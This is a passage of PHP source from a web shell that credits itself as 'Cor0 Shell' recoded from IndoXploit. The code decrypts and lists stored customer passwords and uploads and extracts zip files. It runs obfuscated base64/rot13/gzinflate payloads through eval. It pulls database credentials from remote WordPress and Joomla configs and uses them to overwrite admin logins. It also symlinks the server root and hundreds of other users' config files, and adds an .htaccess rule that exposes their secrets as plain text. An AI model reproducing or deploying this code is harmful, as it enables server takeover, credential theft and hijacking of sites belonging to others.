                echo "<tr><pre><td>$no</td><td>$user</td><td>$pass</td></pre></tr>";  
                $batas = $no++;  
            }   
              
            if(mysql_num_rows($query2) != 0 && ($query2)){  
                while($vx2 = mysql_fetch_array($query2)){  
                    $user = $vx2['customer_email'];  
                    $pass = $crypto->decrypt($vx2['password_hash']);  
                    if(!empty($user) && !empty($pass)){ //tampilin ketika datanya itu ada klo gk ada ya jangan di tampiin   
                        $batas +=1;  
                        echo "<tr><pre><td>$batas</td><td>$user</td><td>$pass</td></pre></tr>";  
                        $batas++;  
                    }  
                }                  
            }  
          
        echo "</table><br>";  
    }  
    //=========================================================================================================  
  }  
}  
function save($format,$data){  
    $fp = fopen($format, 'a');  
    fwrite($fp, $data);  
    fclose($fp);  
}  
function cekbase64($string){   
        $decoded = base64_decode($string, true);  
        if (!preg_match('/^[a-zA-Z0-9\/\r\n+]*={0,2}$/', $string)) return false;  
        if(!base64_decode($string, true)) return false;  
        if(base64_encode($decoded) != $string) return false;  
        return true;//nilai return 1 jika true  
    }  
//----untuk decode password ---/  
class Varien_Crypt_Mcrypt{  
    /**  
     * Constuctor  
     *  
     * @param array $data  
     */  
    public function __construct()  
    {  
    }  

    /**  
     * Initialize mcrypt module  
     *  
     * @param string $key cipher private key  
     * @return Varien_Crypt_Mcrypt  
     */  
    public function init($key)  
    {  
        $this->handler = mcrypt_module_open(MCRYPT_BLOWFISH, '', MCRYPT_MODE_ECB, '');  
        $iv = mcrypt_create_iv (mcrypt_enc_get_iv_size($this->handler), MCRYPT_RAND);  
        $maxKeySize = mcrypt_enc_get_key_size($this->handler);  

        if (iconv_strlen($key, 'UTF-8')>$maxKeySize) {  
            //throw new Varien_Exception('Maximum key size must should be smaller '.$maxKeySize);  
            return null;  
        }  

        mcrypt_generic_init($this->handler, $key, $iv);  

        return $this;  
    }  

    /**  
     * Encrypt data  
     *  
     * @param string $data source string  
     * @return string  
     */  
    public function encrypt($data)  
    {  
        if (!$this->handler) {  
            //throw new Varien_Exception('Crypt module is not initialized.');  
            return null;  
        }  
        if (strlen($data) == 0) {  
            return $data;  
        }  
        return base64_encode(mcrypt_generic($this->handler, $data));  
    }  

    /**  
     * Decrypt data  
     *  
     * @param string $data encrypted string  
     * @return string  
     */  
    public function decrypt($data)  
    {  
        if (!$this->handler) {  
            //throw new Varien_Exception('Crypt module is not initialized.');  
            return null;  
        }  
        if (strlen($data) == 0) {  
            return $data;  
        }  
        return mdecrypt_generic($this->handler, base64_decode($data));  
    }  
          
   
    /**  
     * Desctruct cipher module  
     *  
     */  
    public function __destruct()  
    {  
        if ($this->handler) {  
            $this->_reset();  
        }  
    }  

    protected function _reset()  
    {  
        mcrypt_generic_deinit($this->handler);  
        mcrypt_module_close($this->handler);  
    }  
}  	
}
elseif($_GET['do'] == 'zip') {
	echo "<center><h1>Zip Menu</h1>";
function rmdir_recursive($dir) {
    foreach(scandir($dir) as $file) {
       if ('.' === $file || '..' === $file) continue;
       if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
       else unlink("$dir/$file");
   }
   rmdir($dir);
}
if($_FILES["zip_file"]["name"]) {
	$filename = $_FILES["zip_file"]["name"];
	$source = $_FILES["zip_file"]["tmp_name"];
	$type = $_FILES["zip_file"]["type"];
	$name = explode(".", $filename);
	$accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
	foreach($accepted_types as $mime_type) {
		if($mime_type == $type) {
			$okay = true;
			break;
		} 
	}
	$continue = strtolower($name[1]) == 'zip' ? true : false;
	if(!$continue) {
		$message = "Itu Bukan Zip  , , GOBLOK COK";
	}
  $path = dirname(__FILE__).'/';
  $filenoext = basename ($filename, '.zip'); 
  $filenoext = basename ($filenoext, '.ZIP');
  $targetdir = $path . $filenoext;
  $targetzip = $path . $filename; 
  if (is_dir($targetdir))  rmdir_recursive ( $targetdir);
  mkdir($targetdir, 0777);
	if(move_uploaded_file($source, $targetzip)) {
		$zip = new ZipArchive();
		$x = $zip->open($targetzip); 
		if ($x === true) {
			$zip->extractTo($targetdir);
			$zip->close();
 
			unlink($targetzip);
		}
		$message = "<b>Ye Berhasil :)</b>";
	} else {	
		$message = "<b>Yah Gagal  :(</b>";
	}
}	
echo '<table style="width:100%" border="1">
  <tr><td><h2>Upload And Unzip</h2><form enctype="multipart/form-data" method="post" action="">
<label>Zip File : <input type="file" name="zip_file" /></label>
<input type="submit" name="submit" value="Upload And Unzip" />
</form>';
if($message) echo "<p>$message</p>";
echo "</td><td><h2>Zip Backup</h2><form action='' method='post'><font style='text-decoration: underline;'>Folder:</font><br><input type='text' name='dir' value='$dir' style='width: 450px;' height='10'><br><font style='text-decoration: underline;'>Save To:</font><br><input type='text' name='save' value='$dir/cox_backup.zip' style='width: 450px;' height='10'><br><input type='submit' name='backup' value='BackUp!' style='width: 215px;'></form>";	
	if($_POST['backup']){ 
	$save=$_POST['save'];
	function Zip($source, $destination)
{
    if (extension_loaded('zip') === true)
    {
        if (file_exists($source) === true)
        {
            $zip = new ZipArchive();

            if ($zip->open($destination, ZIPARCHIVE::CREATE) === true)
            {
                $source = realpath($source);

                if (is_dir($source) === true)
                {
                    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

                    foreach ($files as $file)
                    {
                        $file = realpath($file);

                        if (is_dir($file) === true)
                        {
                            $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                        }

                        else if (is_file($file) === true)
                        {
                            $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
                        }
                    }
                }

                else if (is_file($source) === true)
                {
                    $zip->addFromString(basename($source), file_get_contents($source));
                }
            }

            return $zip->close();
        }
    }

    return false;
}
	Zip($_POST['dir'],$save);
	echo "Done , Save To <b>$save</b>";
	}
	echo "</td><td><h2>Unzip Manual</h2><form action='' method='post'><font style='text-decoration: underline;'>Zip Location:</font><br><input type='text' name='dir' value='$dir/file.zip' style='width: 450px;' height='10'><br><font style='text-decoration: underline;'>Save To:</font><br><input type='text' name='save' value='$dir/cox_unzip' style='width: 450px;' height='10'><br><input type='submit' name='extrak' value='Unzip!' style='width: 215px;'></form>";
	if($_POST['extrak']){
	$save=$_POST['save'];
	$zip = new ZipArchive;
	$res = $zip->open($_POST['dir']);
	if ($res === TRUE) {
		$zip->extractTo($save);
		$zip->close();
	echo 'Succes , Location : <b>'.$save.'</b>';
	} else {
	echo 'Gagal Mas :( Ntahlah !';
	}
	}
echo '</tr></table>';	
	}
	elseif($_GET['do'] == 'shellchk') {
		eval(str_rot13(gzinflate(str_rot13(base64_decode(('vUddQtswFH1epf4HcCE1VUxbNvEwdSMGd9FeJtGhPaygyLZ5B6jc5AaHORP/fdf5IoXxsBeiSbGdZu491z6+cTiA1GVPdCkwDTIaDnM5lyVupoT5Nc1ymWWmWpZdRm9FXWOGqzguTlue4Utjpa+p53a411OCIcKZFCxqGVUES63F8XGSylAx3jr+oATX45SXE3LBubGwAsM16RLpY5Jlp+aHh1RR8jscWaPZpI0dzbay/hdZJJqkziiFUZV5t5ohSmIE1POy0M+Bl+381rjEL1whj5xmh/kwvC85oifDTp6wqlXyADr2ynAJKJgpiEaeTrCvLaDIA/J0OCD47FswS6Yi85pEzzrYVoNF2ujEg0OX0jJ1duvpWlW+hORmhxQIElNvPuS/inBksxEA98JsNaPjRIiU9civj2FpYL5jhElwWdN8KmUSZ3fm5NNn2pVFMWILSHUuPTFerhbfSYs1Xax+nV2s4u+Xl4slegNI6MckWBxvdmiUx6SRWHUftOXZ5jWmD/Gi9qAUbdMVvKPKP6elKVxA1QayIrWnG3A59y6ibiMjrDMd9OI+9UfcyU9QsvB3W5VwT4eDHam5xc85F8ACd40q3EvfeMxADe3HzatgAcLD58AhwYNoyOxJDvqc5pYhhrOHCO8Y097nXM6vJACLfvCEct6IWaMfGxj5VXOGSwk5Opai4J5n72gj0Wfza+sM+x29+D6bR5eFWaK2xCcCQcELBxy9Y8DbOjFY2nF26JjF88lC3zmYZHEJ8hYkTFaJFtp7j3dpzPvfdKxZKYx9j1CWkFJfuSbvZMzDAf78MRdXgQ724/Oz5cVtR7dA7BK95oW9TvX6id8rrLYhYIaupzSEqntthpHSeYK2aXmfYEWLxqojGkjH3mRJcryqge1uN6CvYvgbLZdJJPqPi928ml2vNqHd+yU4Q6botthiDsI//AU='))))));
	} elseif($_GET['do'] == 'loghunter')
	{eval(str_rot13(gzinflate(str_rot13(base64_decode(("tUl7YtpVEP87VXyHiZMr0BLsPJqqgJ14QyBquuNrXEUlEExeeL2E5hZ7wS5pmu9+s7ZWgDM5RCmWJXt0f7Pz3JnJ52lphOsTQ+odbjFOjaGl1CCfWIlGTyPgLguIpQ+VoQKRYD7x8N8mDhsqC/iZRJ9DoxtDqNYDyx4xYA+20BUmvjEF7mw4wlL9WZ8J5o69b6lpcyhg8Qipju+aXkAVo35z+/az5KVGhoozmlEBilhLltbJyVCl6WULvpDx7kNE11lDpQ14NJsKY9hQKEyligc8DHNJFU8xcrXUKgRGV6hWhVooC6xMRCshRH2fz31OLQCfKtyQGVyNpOOg+DflE+hSPAhY+VyXsxRlZ6p3x+qRaWsK2sfqx3B13OZmN4E1QrZ9xuyqqkG5KyaEzCsuidTJdfbJEWEGzOYOE5PAim4j1fEJ/eSOSz7XHm5cqFE2n3bv1XwO4jeYFvfNxmyzNSgkrivclR7zuenIilALjFRpEM65SNzHY2A0nGubQ8Fdv+igZpH2sgfcAblAO6Vpj8lUPkUQYezqhVcB3r2DxaJFKL2AlvDykRjQbmRtpXt90eu0zi/+MJu9U/uijb8VuUxbclBEsBs45k+zkpS3K6iYBVLFaBylnOgI0hRL5Y3FQXRZfmiYBqEwMTNal2AkLeYk59Uya4KEVgfxLZhvd2PP9Djjmxm+i3WCbKyD0jm/ely2bV0lC8ZrMI/PSC4dTjskikOPWSQKiiRBlYk2KBQLancWQQZPKjtVNbgbxDLisK9w5ZNcjAFea4uBWE9P9T1a6/e7mtFxb8YtIi+SxYw7S8EcHX4+7R8bVxyhipKCcTHI0urpvyS8ijMz4sz1Wh6GxcLeoH3wp2nwmR/8RjF/+WNj9+FKVsElEitlvUooy9iV913ikmym133XiZ2pQbgjQUJZQrjEE5mO2peRjLGrIc0EvygbVDwqA/c8J+SOLzB2Q6kSJp0MzIZnS+ZUHcuQxS8P5vT/2KW2meKRHbey2DEnkutEuHe1GtDBZRMI6HD2F8rxaCjBjx+QTxpKDfidRgsLX/VsOyt7Mm/6IohStil49uKEetKv3+73D0KMWDsk3BP0jfIvrUvo8YG21e3o94+7mnP8FXTYGyqXptOW2vVBNe2kdNwiZh+r/Ns6D/N6WPV+vrTAT8slKBWe8WvLrREPoeMLav70RqakveP7ZuvYcdErllZIvvJ77rg0sNlJhj1PnYNCxUdCm/1rPK6MLByKKpbARIhG7ES6OQm5NTdvM7826yo34HbLiMVo85WApX0fXpBkw5+LB9CNtD7hkLPex0rFQBHbKs5S5j2nxQVCGfrXN63ehflb++a622H1zN56+/qm9OpMGzw9o09LDyIMydh1CsuTqb6lvxOKR6yiefbiK97cQF4lre4/idARGdaujmDr5XvpxPQXP/guZC3mu3GcxgGvFiMWRjD2jvXBa3biz+dp/gU="))))));}	
elseif($_GET['do'] == 'metu') {
	

echo '<form action="?dir=$dir&do=metu" method="post">';
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); 
    echo 'Byee !';
	
}
elseif($_GET['do'] == 'about') {
	
    echo '<center>Cor0 Shell<hr><font color="white" >IndoXploit Shell Recoded By cor0.id<br>GReeTzz:<br><font color="blue" >./p4kl0nc4t - penjelajah - ./Z-I SLOW - D3LT4 - MR-K4MVR3T - mushck007 - Jim-Saber - ThePrivat - Xl0n3ly<br><br><a href="http://hub.obsidiancyberteam.id/">Obsidian Cyber Team</a>';
	
}
elseif($_GET['do'] == 'auto_cu_wp') {
if($_POST['gass']) {
	echo "<center><h1>WordPress Auto Change User 2</h1>
		<form method='post'>
		Link Config: <br>
		<textarea name='link' style='width: 450px; height:250px;'>";
	UrlLoop($_POST['linkconf'],'wordpress');	
	echo"</textarea><br>
		<input type='submit' style='width: 450px;' name='auto_cu_wp' value='Hajar!!'>
		</form></center>";
}	else {
		echo "<center><h1>WordPress Auto Change User 2</h1>
		<form method='post'>
		Link Config: <br>
		<input type='text' name='linkconf' height='10' size='50' placeholder='http://link.com/cox_symconf/'><br>
		<input type='submit' style='width: 450px;' name='gass' value='Hajar!!'>
		</form></center>";
	}
if($_POST['auto_cu_wp']) {
	
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$link = explode("\r\n", $_POST['link']);
		$user = "coro.id";
		$pass = "coro.id";
		$passx = md5($pass);
		foreach($link as $dir_config) {
			$config = anucurl($dir_config);
			$dbhost = ambilkata($config,"DB_HOST', '","'");
			$dbuser = ambilkata($config,"DB_USER', '","'");
			$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
			$dbname = ambilkata($config,"DB_NAME', '","'");
			$dbprefix = ambilkata($config,"table_prefix  = '","'");
			$prefix = $dbprefix."users";
			$option = $dbprefix."options";
			$conn = mysql_connect($dbhost,$dbuser,$dbpass);
			$db = mysql_select_db($dbname);
			$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
			$result = mysql_fetch_array($q);
			$id = $result[ID];
			$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
			$result2 = mysql_fetch_array($q2);
			$target = $result2[option_value];
			if($target == '') {					
				echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
			} else {
				echo "<font color=green>[</font> $target <font color=green>]</font></font><br>";
			}
			$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
			if(!$conn OR !$db OR !$update) {
				echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
				mysql_close($conn);
			} else {
                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                    echo "[+] username: <font color=lime>$user</font><br>";
                    echo "[+] password: <font color=lime>$pass</font><br><br>";     
                    
            	mysql_close($conn);
			}
		}
	} 	

}
elseif($_GET['do'] == 'auto_cu_joomla') {
if($_POST['gass']) {
	echo "<center><h1>Joomla Auto Change User 2</h1>
		<form method='post'>
		Link Config: <br>
		<textarea name='link' style='width: 450px; height:250px;'>";
	UrlLoop($_POST['linkconf'],'joomla');	
	echo"</textarea><br>
		<input type='submit' style='width: 450px;' name='auto_cu_joomla' value='Hajar!!'>
		</form></center>";
}	else {
		echo "<center><h1>Joomla Auto Change User 2</h1>
		<form method='post'>
		Link Config: <br>
		<input type='text' name='linkconf' height='10' size='50' placeholder='http://link.com/cox_symconf/'><br>
		<input type='submit' style='width: 450px;' name='gass' value='Hajar!!'>
		</form></center>";
	}
if($_POST['auto_cu_joomla']) {
	
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$link = explode("\r\n", $_POST['link']);
		$user = "coro.id";
		$pass = "coro.id";
		$passx = md5($pass);
		foreach($link as $dir_config) {
			$config = anucurl($dir_config);
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE id='$id'");
					echo "Config => ".$dir_config."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => Done , Username : <font color=lime>$user</font> Password : <font color=lime>$pass</font><br><br>";
					}
					mysql_close($conn);
					}
	} 	
}
elseif($_GET['do'] == 'symconfig') {
if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
echo '<script>alert("Skid this won\'t work on Windows")</script>';
exit;
}
else
{
if($_POST["m"] && !$_POST["passwd"]==""){
@mkdir("cox_symconf", 0777);
@chdir("cox_symconf");
@symlink("/","root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex jancox.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents(".htaccess",$htaccess);
$etc_passwd=$_POST["passwd"];
$etc_passwd=explode("\n",$etc_passwd);
foreach($etc_passwd as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[0];

@symlink('/','cox_symconf/root');
@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
